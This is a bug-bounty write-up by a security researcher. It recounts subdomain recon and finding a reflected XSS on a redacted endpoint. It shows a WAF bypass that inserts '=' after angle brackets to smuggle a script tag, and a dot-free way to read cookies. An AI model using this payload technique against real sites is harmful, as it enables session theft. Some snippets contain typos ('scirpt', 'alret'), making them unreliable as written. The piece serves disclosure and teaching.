---
title: My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS
url: https://infosecwriteups.com/my-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-02-17
fetch_date: 2025-10-06T20:33:37.237499
---

# My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2Fe0534b6f05e4&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fmy-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Fmy-first-bug-how-i-was-able-to-bypass-the-waf-and-uncover-a-reflected-xss-e0534b6f05e4&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-e0534b6f05e4---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-e0534b6f05e4---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# My First Bug: How I Was Able to Bypass the WAF and Uncover a Reflected XSS

[![Fares Elsadek](https://miro.medium.com/v2/resize:fill:64:64/1*nAY5qQf2KJnxxN4rqs370A.jpeg)](https://fares7elsadek.medium.com/?source=post_page---byline--e0534b6f05e4---------------------------------------)

[Fares Elsadek](https://fares7elsadek.medium.com/?source=post_page---byline--e0534b6f05e4---------------------------------------)

3 min read

·

Aug 22, 2023

--

15

Listen

Share

Hello everyone, I’m Fares. Today, I’ll share the story of how I successfully identified a reflected XSS vulnerability within a public bug bounty program.

To begin with, I followed my usual process of uncovering subdomains, employing tools like [Subfinder](https://github.com/projectdiscovery/subfinder), [assetfinder](https://github.com/tomnomnom/assetfinder), and more.

subfinder :

```
subfinder -d $domain -all > subdomains.txt
```

assetfinder :

```
assetfinder $domain -subs-only | grep $domain$ >> subdomains.txt
```

Once you’ve compiled a list of subdomains using your preferred tool, you can eliminate duplicates using the following command:

```
cat subdomains.txt | sort -u > sub-list.txt
```

Now, our goal is to discover live subdomains. For this task, I use a tool called [httpx](https://github.com/projectdiscovery/httpx) to automate the process.

```
cat sub-list.txt | httpx > live-sub.txt
```

After getting the live subdomains, I decided to check them manually. Since the program was public and complex, it was better to search things by hand rather than using automation.

After a deep dive into the program, I discovered an endpoint that appeared to be structured like this:

<https://example.domain.com/domain/modules/name.aspx>

I figured that if I could fuzz parameters and find “ak” as a valid parameter, I could try adding “FUZZ” to it and analyze the response.

example:

<https://example.domain.com/domain/modules/name.aspx>?ak=FUZZ

the response was like this :

```
<p><span class="red"><span id="ak">FUZZ</span></span></p>
```

That’s interesting because it’s reflected in the response code. So, I attempted to inject a JavaScript code like this:

<https://example.domain.com/domain/modules/name.aspx>?ak=<script>alert(“hacked”)</script>

But when submitting this request, I was redirected to an error page, which was quite disappointing :(.

So, I started thinking about how to bypass this. I tried various payloads from the internet, but none of them worked for me.

So, I chose to look into it. After trying many different payloads, I found that using “<” and “>” symbols in the payload would cause the page to redirect to the error page again.

After attempting to encode and even double encode it, it still didn’t work either.

But I observed something interesting: when I placed certain special characters after the angle brackets, they were reflected in the response without triggering a redirect.

it was like this:

<https://example.domain.com/domain/modules/name.aspx>?ak=<&

the response will be like this:

```
<p><span class="red"><span id="ak"><&</span></span></p>
```

so I tried many payloads with the same thing and doesn’t work for me.

After trying out various payloads, I realized that when I submitted the “.” and “=” signs, they were stripped and didn’t show up in the response.

so this will be like:

<https://example.domain.com/domain/modules/name.aspx>?ak=hacked===.

the response will be:

```
<p><span class="red"><span id="ak">hacked</span></span></p>
```

This is getting interesting. Let’s test by adding angle brackets before the equal sign, like this:

```
https://example.domain.com/domain/modules/name.aspx?ak=<=hacked>=
```

the response was like this:

```
<p><span class="red"><span id="ak"><hacked></span></span></p>
```

And I didn’t get redirected, so I was like:

So, I started crafting the payloads using the same approach, which looked like this:

```
<=script>=alert("hacked")<=/scirpt>=
```

and the response was like this :

```
<p><span class="red"><span id="ak"><script>alert("hacked")</script></span></span></p>
```

Press enter or click to view image in full size

![]()

But here’s a little issue: I can’t access the cookie because the server removes the “.” symbol.

After doing some research, I discovered methods to obtain it without using the “.” symbol, such as:

```
alret(document["cookie"])
```

I hope you enjoyed reading the writeup!

the tools that i used: Burp suit , subfinder , assetfinder , httpx

linkedin: <https://www.linkedin.com/in/fares-elsadek/>

twitter : <https://twitter.com/err0rbyn1ght>

[Xss Attack](https://medium.com/tag/xss-attack?source=post_page-----e0534b6f05e4---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----e0534b6f05e4---------------------------------------)

[Infosec](https://medium.com/tag/infosec?source=post_page-----e0534b6f05e4---------------------------------------)

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----e0534b6f05e4---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----e0534b6f05e4---------------------------------------)

--

--

15

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--e0534b6f05e4---------------------------------------)

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:128:128/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--e0534b6f05e4---------------------------------------)

Follow

[## Published in InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---post_publication_info--e0534b6f05e4---------------------------------------)

[71K followers](/followers?source=post_page---post_publication_info--e0534b6f05e4------------------------------...